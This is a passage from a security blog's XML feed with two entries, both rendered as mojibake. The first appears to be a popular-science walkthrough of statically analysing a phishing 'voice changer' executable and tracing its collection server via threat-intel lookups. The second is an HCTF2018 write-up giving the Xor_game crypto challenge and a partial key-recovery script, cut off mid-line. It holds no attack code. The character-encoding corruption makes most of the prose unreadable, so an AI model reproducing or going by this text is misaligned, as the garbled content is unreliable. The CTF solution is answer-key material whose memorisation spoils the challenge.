        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="è¿½è¸ªæº¯æº-ç™½è¯æ–‡è®²ç›—å·â€“ç§‘æ™®ç¯‡"><a href="#è¿½è¸ªæº¯æº-ç™½è¯æ–‡è®²ç›—å·â€“ç§‘æ™®ç¯‡" class="headerlink" title="è¿½è¸ªæº¯æº_ç™½è¯æ–‡è®²ç›—å·â€“ç§‘æ™®ç¯‡"></a>è¿½è¸ªæº¯æº_ç™½è¯æ–‡è®²ç›—å·â€“ç§‘æ™®ç¯‡</h1><blockquote><p>ğŸ†’ä¸€ç›´ä¸€ç›´ä»¥æ¥ï¼Œæ€»æ˜¯æœ‰äººä¸æ–­è¢«ç›—qqï¼Œç„¶åè¢«ç”¨ä»¥æ¶æ„ç›—å·è€…æ•£æ’­æ›´å¤šçš„æ¶æ„é“¾æ¥æˆ–è€…è¿›è¡Œè¯ˆéª—ç›ˆåˆ©æ´»åŠ¨ï¼Œæ¶æ€§å¾ªç¯ï¼Œæ„ˆæ¼”æ„ˆçƒˆï¼Œä¸ºäº†ç»™åŒå­¦ä»¬ç¨å¾®ç§‘æ™®ä¸€ä¸‹åŸºæœ¬çš„ç›—å·åŸç†ï¼Œæ•…æœ‰æ­¤æ–‡ã€‚</p><p>ä»æ‰«äºŒç»´ç ç›—å·ï¼Œåˆ°æ¨¡æ‹Ÿqqç™»å½•ç•Œé¢çš„é’“é±¼ç½‘ç«™ç›—å·ï¼Œå†åˆ°ä¼ªé€ qqåœ¨çº¿æ–‡æ¡£è¯±å¯¼qqç”¨æˆ·ç‚¹å‡»å¯¼è‡´çš„ç›—å·ï¼Œæ€»ä¹‹ç›—å·çš„æ–¹å¼å„ç§å„æ ·ï¼Œä½†éƒ½ç¦»ä¸å¼€ä¸€ä¸ªé‡ç‚¹ï¼Œ<strong>é‚£å°±æ˜¯ä½ çš„è´¦å·æ˜¯ä»ä½ çš„è®¾å¤‡ä¸Šé¢ä¼ è¾“ç»™åˆ«äººçš„</strong>ï¼ˆå¦‚æœä½ æ²¡æœ‰åˆ°å¤„å®£æ‰¬ä½ çš„å¯†ç çš„è¯ğŸ˜„ï¼‰ï¼Œæˆ–æ˜¯è®¾å¤‡è¢«æ¤å…¥æœ¨é©¬ï¼Œè®°å½•é”®ç›˜è¾“å…¥ï¼ŒæŠ‘æˆ–æ˜¯ä¼ªé€ é¡µé¢ä½¿å¾—ç”¨æˆ·ä¸»åŠ¨è¾“å…¥è´¦å·å¯†ç ç­‰ç­‰ç­‰ç­‰ã€‚</p><p>æ—¢ç„¶çŸ¥é“ï¼Œè´¦å·å¯†ç æ˜¯ä»è‡ªå·±çš„è®¾å¤‡ä¸Šä¼ åˆ°æ¶æ„ç›—å·è€…æ‰‹ä¸Šçš„ï¼Œé‚£ä¹ˆé—®é¢˜å°±å˜å¾—ç®€å•äº†ã€‚</p><p>æ¥ä¸‹æ¥å°±ä»ä¸€ä¸ªé‚®ä»¶é’“é±¼è¯´èµ·ï¼Œäº‹æƒ…æ˜¯è¿™æ ·å­çš„â€¦â€¦</p></blockquote><h2 id="0x00-æ”¶åˆ°ä¸€å°å¯çˆ±çš„é‚®ä»¶"><a href="#0x00-æ”¶åˆ°ä¸€å°å¯çˆ±çš„é‚®ä»¶" class="headerlink" title="0x00 æ”¶åˆ°ä¸€å°å¯çˆ±çš„é‚®ä»¶"></a>0x00 æ”¶åˆ°ä¸€å°å¯çˆ±çš„é‚®ä»¶</h2><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120225806.png" alt=""></p><blockquote><p>é‚®ä»¶ä¸­æœ‰å¯çˆ±çš„èŒå¦¹å˜å£°å™¨ï¼Œæœ‰ç¦åˆ©å°ç”µå½±ï¼Œæ¸¸æˆåŠ é€Ÿå™¨çš„é“¾æ¥ï¼Œå¯è°“æ˜¯å¸å¼•äººæäº†ï¼Œæˆ‘ä»¬å…ˆå»è¿™ä¸ªé“¾æ¥ä¸‹è½½ä¸€ä¸ªèŒå¦¹å˜å£°å™¨ç©ä¸€ä¸‹ã€‚</p><p>è¿™æ˜¯ä¸€ä¸ªååˆ†å…¸å‹çš„exeæ–‡ä»¶ï¼Œä¸€èˆ¬ç¨å¾®æœ‰äº›åŸºç¡€ç´ å…»çš„äººéƒ½ä¸ä¼šéšä¾¿ç‚¹å¼€è¿™ç§exeæ–‡ä»¶çš„å“¦ã€‚æ¯”exeæ–‡ä»¶æ›´å®¹æ˜“ä¸­æ‹›çš„æ˜¯æ–‡æ¡£æ–‡ä»¶ï¼Œå¦‚docæ–‡æ¡£ï¼Œæ¶æ„äººå‘˜å¯èƒ½ä¼šåˆ©ç”¨å¦‚officeçš„æ¼æ´ï¼Œå½“ä½ ç‚¹å¼€ä»–ç²¾å¿ƒåˆ¶ä½œçš„æ–‡æ¡£çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘å¦‚å®ç—…æ¯’ï¼Œè¿œç¨‹ä»£ç æ‰§è¡Œç­‰é—®é¢˜ï¼Œæ­£ä¸­äººä¸‹æ€€ã€‚</p></blockquote><p>è™šæ‹Ÿæœºæ˜¯ä¸ªå¥½ä¸œè¥¿å‘¢ï¼Œå¦‚æœä½ æœ‰ä»€ä¹ˆä¸œè¥¿éè¦å†’ç€é£é™©å»è¿è¡Œä¸€ä¸‹ï¼Œé‚£ä¹ˆä¸å¦‚è£…ä¸ªè™šæ‹Ÿæœºå…ˆè¯•è¯•æ°´ï¼Œè¿™æ¬¡åˆ†ææˆ‘ä»¬å°±åœ¨ä¸€ä¸ªwin7çš„è™šæ‹Ÿæœºä¸­è¿›è¡Œã€‚</p><h2 id="0x01-ä½¿ç”¨å·¥å…·ï¼ˆIDA-Proï¼‰-è¿›è¡Œç®€å•çš„é™æ€åˆ†æ"><a href="#0x01-ä½¿ç”¨å·¥å…·ï¼ˆIDA-Proï¼‰-è¿›è¡Œç®€å•çš„é™æ€åˆ†æ" class="headerlink" title="0x01 ä½¿ç”¨å·¥å…·ï¼ˆIDA Proï¼‰ è¿›è¡Œç®€å•çš„é™æ€åˆ†æ"></a>0x01 ä½¿ç”¨å·¥å…·ï¼ˆIDA Proï¼‰ è¿›è¡Œç®€å•çš„é™æ€åˆ†æ</h2><p>å…¶å®éƒ½æ²¡æ€ä¹ˆåˆ†æç¨‹åºé€»è¾‘ï¼Œå› ä¸ºã€‚ã€‚ã€‚è¿™ç¨‹åºå¤ªç²—ç³™äº†ã€‚</p><p>ä¸‹è½½èŒå¦¹å˜å£°å™¨.exeåï¼Œå¯ä»¥å…ˆçœ‹çœ‹æ–‡ä»¶å±æ€§å“¦ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120230944.png" alt=""></p><p>æ–‡ä»¶å¤§å°ä»…æœ‰707kbï¼Œä¸€ä¸ªå˜å£°å™¨ä½ è§‰å¾—åªéœ€è¦707kbå¤§å°å—ï¼Ÿå¾ˆæ˜æ˜¾ä¸æ­¢çš„å¥½ä¸å¥½ï¼Œæ¯•ç«Ÿå˜å£°å™¨è¿™ä¹ˆç§€çš„ç©æ„å„¿æ˜¯å§ã€‚</p><p>å…ˆç”¨PC hunterç›‘æ§ä¸€ä¸‹è¿è¡Œè¯¥æ–‡ä»¶ä¹‹å‰ï¼Œæˆ‘ä»¬çš„ç½‘ç»œæƒ…å†µï¼ˆè¿›ç¨‹ï¼ŒæœåŠ¡ç­‰ä¿¡æ¯ï¼‰ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120231308.png" alt=""></p><p>åŒå‡»è¿è¡Œä¸€ä¸‹<code>èŒå¦¹å˜å£°å™¨.exe</code>ï¼Œemmmäº‹å®æ˜¯å› ä¸ºè™šæ‹Ÿæœºä¸­ç¼ºå°‘ä¸€äº›æ–‡ä»¶å¯¼è‡´æ— æ³•è¿è¡Œï¼Œæ­£å¸¸æƒ…å†µä¸‹è¿è¡Œä¹‹ååŸºæœ¬ä¸Šæ˜¯å¯ä»¥çœ‹åˆ°ä¼šæœ‰å¤šå‡ºæ¥çš„å¼‚å¸¸è¿›ç¨‹ï¼Œè€Œè¿™ä¸ªè¿›ç¨‹ä¼šå¯¹æŸä¸ªipæˆ–è€…åŸŸåè¿›è¡Œè¿æ¥ï¼Œä¼ è¾“çªƒå–çš„ä¿¡æ¯ç­‰ç­‰ã€‚</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥ç›´æ¥åˆ†æå§ï¼ŒIDA Proåæ±‡ç¼–ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120232154.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°ï¼Œé€šè¿‡åæ±‡ç¼–ä¹‹åï¼Œç¨‹åºå†…éƒ¨çš„ä¸€äº›ä¿¡æ¯ä»¥æ±‡ç¼–ä»£ç çš„å½¢å¼å±•å¼€ï¼Œä½†æ˜¯æˆ‘ä»¬æ—¢ç„¶æ˜¯ä»¥ç™½è¯æ–‡çš„å½¢å¼æ¥è®²è¿™ç¯‡ç§‘æ™®æ–‡ç« ï¼Œé‚£è‚¯å®šä¸æ˜¯åˆ†æä»£ç å’¯ï¼Œåªè¦æ˜ç™½è¿™ä¸ªæµç¨‹å°±è¡Œå•¦ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨IDA proçš„<code>shift + f12</code>å¿«æ·é”®æ¥æå–è¿™ä¸ª<code>èŒå¦¹å˜å£°å™¨.exe</code>ä¸­çš„ä¸€äº›å­—ç¬¦ä¸²ï¼Œæ¥çœ‹çœ‹æœ‰æ²¡æœ‰å¯ç–‘çš„æ˜æ˜¾çš„çº¿ç´¢ã€‚</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120232604.png" alt=""></p><p>å¾ˆç®€å•å°±çœ‹åˆ°äº†ä¸€äº›å…³é”®å­—çœ¼ï¼Œå¦‚<code>Connection==&gt;è¿æ¥||Pipe==&gt;ç®¡é“||Hostname==&gt;ä¸»æœºå</code>ç­‰ä¿¡æ¯ã€‚å½“ç„¶ï¼Œæ›´é«˜çº§ä¸€ç‚¹çš„è½¯ä»¶æˆ–è€…é’“é±¼ç¨‹åºä¸ä¼šåƒè¿™ä¸ªè¿™ä¹ˆç²—ç³™ï¼Œè‡³å°‘ä¼šç»™å…³é”®å­—ç¬¦ä¸²åŠ å¯†ï¼ŒåŠ å£³æˆ–è€…åŠ åè°ƒè¯•æªæ–½ï¼Œè¿™éƒ½æ˜¯åè¯äº†ï¼ˆä¼°è®¡å°ç™½å¬ä¸æ‡‚ï¼‰ã€‚</p><p>é‚£ä¹ˆå†ç»†ç»†æ‰¾æ‰¾ï¼Œèƒ½ä¸èƒ½æ‰¾åˆ°è¯¥é’“é±¼ç¨‹åºæ•£å¸ƒè€…çš„è¸ªè¿¹å‘¢ï¼Ÿ</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120233000.png" class="lazyload"></p><p>æœä¸å…¶ç„¶ï¼ŒIPåœ°å€æ‹¿åˆ°äº†ï¼Œå»çœ‹ä¸€çœ¼å–ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120233142.png" class="lazyload"></p><h2 id="0x02-ç®€å•åœ°è¿½è¸ªæº¯æº"><a href="#0x02-ç®€å•åœ°è¿½è¸ªæº¯æº" class="headerlink" title="0x02 ç®€å•åœ°è¿½è¸ªæº¯æº"></a>0x02 ç®€å•åœ°è¿½è¸ªæº¯æº</h2><p>ä¸Šé¢çš„é‚£ä¸ªurlæ˜¯ä¸€ä¸ªç”¨æ¥æ¥æ”¶çªƒå–åˆ°çš„ä¿¡æ¯çš„æ¥å£ï¼Œé‚£ä¹ˆé€šè¿‡ç°æœ‰çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å¦‚ä½•æ·±ä¸€æ­¥è¿½è¸ªæº¯æºåˆ°è¿™ä½å¯çˆ±çš„ç¨‹åºæ•£å¸ƒè€…å‘¢ï¼Ÿ</p><p>å½“ç„¶æ˜¯å¨èƒæƒ…æŠ¥åˆ†æå¹³å°èµ°ä¸€æ³¢å’¯ï¼ˆå¦‚VTï¼Œå¾®æ­¥ï¼‰ï¼Œå…¶å®æˆ‘ä»¬ä¸€å¼€å§‹å°±å¯ä»¥æŠŠè¯¥exeæ–‡ä»¶ä¸Šä¼ åˆ°å¨èƒæ£€æµ‹å¹³å°è¿›è¡Œæ£€æµ‹ï¼ˆå¹³å°å¯ä»¥å¯¹URLï¼ŒMD5ï¼ŒIPç­‰ç­‰ä¿¡æ¯è¿›è¡Œå…³è”æŸ¥è¯¢ï¼‰ï¼Œä½†æ˜¯ä¸ºäº†æƒ…èŠ‚éœ€è¦ï¼Œå…ˆç»†ç»†åˆ†æä¸€ä¸‹æ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç°åœ¨è¦åšçš„æ˜¯ç”¨å¨èƒæƒ…æŠ¥å¹³å°æŸ¥æ‰¾å¾—åˆ°çš„IPå…³è”ä¿¡æ¯ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120233709.png" class="lazyload"></p><p>å®é™…ä¸Šç”¨æœ€å¼€å§‹é‚®ç®±ä¸­æ”¶åˆ°çš„é‚£ä¸ªåŸŸåä¹Ÿä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹çœ‹å…³è”çš„æ–‡ä»¶æ£€æµ‹ä¿¡æ¯ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120233930.png" class="lazyload"></p><p>å¯ä»¥çœ‹åˆ°æ£€æµ‹åˆ°äº†å¨èƒï¼Œå…·æœ‰ä¸€å®šçš„å±é™©æ€§ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120234058.png" class="lazyload"></p><p>å…¶å®æ¥ä¸‹æ¥å°±å¯ä»¥å¯¹è¯¥IPè¿›è¡Œæ›´æ·±å…¥çš„äº†è§£äº†ï¼ˆæ”»å‡»æ˜¯ä¸å¯èƒ½æ”»å‡»çš„ï¼Œé¡¶å¤šæ‰«ææ‰«æç›®å½•ï¼Œæ‰«æç›®å½•æˆ‘ä¹Ÿæ˜¯æ²¡æœ‰æ‰«çš„ï¼‰å› ä¸ºä¸‹é¢å¾—åˆ°çš„å‡ ä¸ªurlå°±å¤Ÿæˆ‘ä»¬æ‰¾åˆ°é‚£ä¸ªå¯çˆ±çš„äººäº†ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120234312.png" class="lazyload"></p><p>è®¿é—®ä¸€ä¸‹è¿™äº›urlï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120234500.png" class="lazyload"></p><p>å—¯å·®ä¸å¤šå°±å¾—äº†ï¼Œæˆ‘ä»¬ä¹Ÿå°±ä¸æ‰“æ‰°äººå®¶äº†å§ã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><blockquote><p>æ€»ä¹‹å°±æ˜¯ï¼Œæ¶æ„é“¾æ¥å°‘ç‚¹å»ç‚¹å¼€å•¦ï¼Œå°±ç®—ç‚¹å¼€äº†ï¼Œæ²¡æœ‰èµ‹äºˆæƒé™ï¼Œæˆ–è€…ä½ æ²¡æœ‰ä¸»åŠ¨è¾“å…¥è´¦å·å¯†ç ï¼Œå†æˆ–è€…æ˜¯ä½ æ²¡æœ‰ç½‘ç»œï¼Œéƒ½åŸºæœ¬ä¸ä¼šå¯¼è‡´è¢«ç›—å·çš„å•¦ã€‚</p><p>æ¶æ„æ–‡ä»¶è‡ªå·±éœ€è¦å¥½å¥½åˆ†è¾¨å’¯ï¼Œå°±ä»ä¸Šé¢çš„æ–¹æ³•æˆ‘ä»¬åŸºæœ¬ä¸Šå°±å¯ä»¥é¿å…æ¶æ„æ–‡ä»¶äº†ï¼Œä½†æ˜¯æ¶æ„æ–‡æ¡£è¿˜æ˜¯éœ€è¦æ³¨æ„ï¼Œè™½ç„¶æ¶æ„æ–‡æ¡£çš„é’ˆå¯¹æ€§ï¼Œä¼ªé€ éš¾åº¦æ¯”è¾ƒé«˜ï¼Œä½†æ˜¯ä¸æ’é™¤æŸå¤©ä½ å°±è¢«é’ˆå¯¹äº†ï¼Œä½ è¯´æ˜¯å§ï¼ŸğŸ¤£</p></blockquote><p>è‹¥æœ‰ä¸ç¬¦ï¼Œè¿˜æœ›æ–§æ­£ã€‚</p><p>Published by Yof3ng.</p>]]></content>
      
      
      <categories>
          
          <category> ä¿¡æ¯å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¿½è¸ªæº¯æº </tag>
            
            <tag> ä¿¡æ¯å®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>HCTF2018_å­¦ä¹ è®°å½•</title>
      <link href="/2018/11/13/HCTF2018-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>/2018/11/13/HCTF2018-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="HCTF2018-å­¦ä¹ è®°å½•"><a href="#HCTF2018-å­¦ä¹ è®°å½•" class="headerlink" title="HCTF2018_å­¦ä¹ è®°å½•"></a>HCTF2018_å­¦ä¹ è®°å½•</h1><blockquote><p>é‡æ•´æ——é¼“å†ä¸Šè·¯ğŸ˜­ï¼Œhctfæ²¡å¤ªé‡è§†(å…¶å®é‡è§†äº†ä¹Ÿä¸ä¼šåš)ï¼Œåªèƒ½èµ›åçœ‹çœ‹å¸ˆå‚…ä»¬çš„writeupå­¦ä¹ ä¸€æ³¢ã€‚æ¥ä¸‹æ¥æ‰“ç®—å­¦ä¸€ä¸‹åŸºç¡€çš„å¯†ç å­¦ï¼Œä¸ç„¶è€æ˜¯æ‡µé€¼å¯æ²¡ç”¨å‘¢ã€‚</p></blockquote><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://xz.aliyun.com/t/3257#toc-17" target="_blank" rel="noopener">HCTF2018_CNSS_WP</a></p><p><a href="https://xz.aliyun.com/t/3256#toc-21" target="_blank" rel="noopener">HCTF2018_ å¤©æ¢ _WP</a></p><p><a href="https://xz.aliyun.com/t/3253#toc-23" target="_blank" rel="noopener">HCTF2018_Eur3kA_WP</a></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="crypto1-Xor-game"><a href="#crypto1-Xor-game" class="headerlink" title="crypto1 - Xor_game"></a>crypto1 - Xor_game</h3><blockquote><p>é¢˜ç›®ç»™å‡ºäº†ä¸€ä¸ªcipher.txtè£…æœ‰å¯†æ–‡ï¼Œä»¥åŠä¸€ä¸ªåŠ å¯†è„šæœ¬ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><p>cipher.txt:</p><pre class=" language-python"><code class="language-python">ciMbOQxffx0GHQtSBB0QSQIORihXVQAUOUkHNgQLVAQcAVMAAAMCASFEGQYcVS8BNh8BGAoHFlMAABwCTSVQC2UdMQx5FkkGEQQAAVMAAQtHRCNLF0NSORscMkkaHABSExIYBQseUmBCFgtSKwEWfwELFRcGbzwEDABHVS8DDAcXfwUcMQwCDUUBCgYYSQEBATNKGwQeOkkbPhsYERYGDB0TYzwCUSVCDE8dKh0BNg4GAAkLSVMWHBpHQCxQF08AOhkWPh1OAA0XRQQRBQJKQyVKFghSMA95Gh8LGhEHBB8YEE4UViFaEQEVfwAdfx0GEUUWAAARGxpHTiFQERx4FkkROgUHERMXRTpUCANtYy9RFk8TLEkHNwxOFhcbAhsASR0STC1GCk8UMwYEOhsdfiEdRR0bHU4QSDRLHR0XO0kGMQ0LEgATERYQSQgORDJaWAsXMgYdfxsbGAB4LRYVGxpHUyFXHU8TMQ1TPRsLFREaDB0TSRoIASJGGR1SKwEWfwUBFQFSChVUHQYCASNWFQ0XLRocMgxkNgoAABd<span class="token operator">+</span>PRkIKwkDEAoTLQ1TKwELVAgHFhoXRU4BUy9OWBsaOkkeMAYAVAQcAVMXCBwEQDNQci4HJwAfNggcDUUXHQcGDAMCASFGCxsaOh0aPAAdGUUQBBoASRoIASNCCBsHLQxTMgAdABx4IxoYBQcJRmBXEApSNgcHOgcdEUUeDBURRU4FVDQDGQMBMEkVNgUCHQsVRQccDE4XVDJGcjsaOhsWfwgcEUUTCQQVEB1HTCVOFx0bOhpTKwEcGxAVDRwBHU4TSSUDHQ4AKwF5FkkMEQkbAAURSSdHQC0pPAYXO0kSLEkaHABSFAYdDBpHQyVCDRsLfwYVfwgbABAfC1MYDA8RRDMpKwcXMQ5TNhpOGgoGRRAcCAEUDWBQFQAZOkkUOhoaARcXbzYCDABHVilPDE8TMxocfxsLAAQbCxYQSQwITyUDCB0dKg0fJkk<span class="token operator">/</span>HQsVRTURBwlHTDVQGwMXVSYQPBwCAG8mDQERDGQuAShGGR1SMwYFOkVOPUUQAB8dDBgCASlNWAMdKQx5EwYYEUUbFlMVSR4ITiwDFwlSLB0BKg4JGAwcAlMWBRsCDCdRHQocfwgfOAgLfiQBRRcRGgELQDRGWAIbPBsccgsbBhYGRRwSSRkOTyQpOgMXOg0aMQ5OAA0ACgYTAU4KWGBVHQYcLGMqOggcB0UBERIAAAEJRCQDEQFSKwEWfwsLGAwXA3kyBhsVKwkDGgoeNgwFOkkaHAQGRRIYBU4EQC4DEAoTLWM2KQwAVAQcERoXAB4GVSUDHAYBPBsWKwxCVCxSCBYASRoPRGBMDAcXLUkHNwwHBkUdEh1<span class="token operator">+</span>OgEKRGBAGQFSMQYHfw4cFRYCRQccDE4KTi1GFht4EwwVK0kaG0UGDRZULA8UVWBXF08VMEkkOhoaWEUGDRZUDQsGRWBODRwGfwccK0kcEREHFx1UHQFHTy9UEAoAOmMgOgxCVCxSEhYVG049QC4DPgMdKAwBLEkBGkUfHFMcDA8DDWBKFk8UKgUffwsCGwofRRIYBgAAATRLHU8FPhBTPgUCVBEaAFMDCBdtZzJGCRoXMR0fJkkDHRYBABdUGgEKRGwDGhoGfwgfLAZOEAAXFR8NSQMIVyVHWA0Lfx4aMQ1CVAMACgAARU4UTy9UWAAAfxsSNgdkMgwEAHkkGw8NTyEDKA4APgQaKwhCVBYdCh1UCB1HUi9MFk8TLGMfNg8LVAcXRRERCBsTSCZWFE8eNgIWfxobGQgXF1MSBQEQRDJQWA4cO0kXOggaHEUeDBgRSQ8SVTVOFk8eOggFOhpkNQkBClMXCBwCASFBFxoGfx4bPh1OHAQB</code></pre><p>challenge.py:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#challenge.py</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>strxor <span class="token keyword">import</span> strxor<span class="token keyword">import</span> base64<span class="token keyword">import</span> random<span class="token keyword">def</span> <span class="token function">enc</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token punctuation">(</span>key <span class="token operator">*</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">/</span> len<span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span>len<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> strxor<span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span>poem <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'poem.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">"hctf{xxxxxxxxxxx}"</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'cipher.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>enc<span class="token punctuation">(</span>poem<span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; é€šè¿‡ç®€å•åˆ†æå…¶é€»è¾‘ï¼Œå¯ä»¥çŸ¥é“xor_keyå°±æ˜¯flagèŠ±æ‹¬å·ä¸­çš„å†…å®¹ï¼Œé€šè¿‡è¯¥xor_keyå¯¹poem.txtä¸­çš„å†…å®¹è¿›è¡ŒåŠ å¯†ï¼Œå¹¶ä¸”éœ€è¦å¯¹åº”é•¿åº¦ã€‚å› ä¸ºpoem.txtä¸­æ˜¯ä¸€é¦–è¯—ï¼Œè¯—ä¸­å¯èƒ½ä¼šå‡ºç°å­—æ¯ï¼Œæ•°å­—ï¼Œå¼•å·ï¼Œæ¢è¡Œç­‰ç­‰åˆæ³•å­—ç¬¦ï¼Œç”±äºæˆ‘ä»¬åªæœ‰å¯†æ–‡ï¼Œå¹¶ä¸”çŸ¥é“xorçš„è§„å¾‹ï¼Œæ˜¯xor_keyçš„é•¿åº¦æ¥å†³å®šçš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡éå†åŠ ä¸Šç®€å•çš„åˆ¤æ–­ï¼Œå†™å‡ºå¦‚ä¸‹ä»£ç (è¿™æ˜¯æœ€ç®€å•çš„è§£æ³•ï¼Œå‚ç…§<a href="https://xz.aliyun.com/t/3257#toc-17" target="_blank" rel="noopener">ç”µå­ç§‘å¤§CNSSæˆ˜é˜Ÿçš„wp</a> ï¼‰ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#exp.py</span><span class="token keyword">import</span> base64<span class="token comment" spellcheck="true">#æ£€æµ‹æ˜¯å¦ä¸ºè¯—æ­Œæ­£å¸¸å­—ç¬¦</span><span class="token keyword">def</span> <span class="token function">invalid</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> chr<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token string">'{}[]@#%^*=+'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token comment" spellcheck="true">#æ¢è¡Œç¬¦ä¸ºæ­£å¸¸å­—ç¬¦</span>    <span class="token keyword">if</span> x <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> x <span class="token operator">&lt;=</span> <span class="token number">31</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span>cipher <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>open<span class="token punctuation">(</span><span class="token string">'cipher.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># å¯èƒ½çš„xor_keyé•¿åº¦</span><span class="token keyword">for</span> L <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    cc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#å¯¹xor_keyçš„æ¯ä¸€ä½è¿›è¡Œæšä¸¾</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">:</span>        t <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> cand <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token comment" spellcheck="true">#æ­¥é•¿ä¸ºxor_keyé•¿åº¦ï¼Œè¿›è¡Œæµ‹è¯•</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>i<span class="token punctuation">,</span> len<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">,</span> L<span class="token punctuation">)</span><span class="token punctuation">:</span>                tmp <span class="token operator">=</span> cand <span class="token operator">^</span> cipher<span class="token punctuation">[</span>j<span class="token punctuation">]</span>                <span class="token comment" spellcheck="true">#è‹¥ä¸ä¸ºæ­£å¸¸å­—ç¬¦ï¼Œåˆ™å°†flagæ 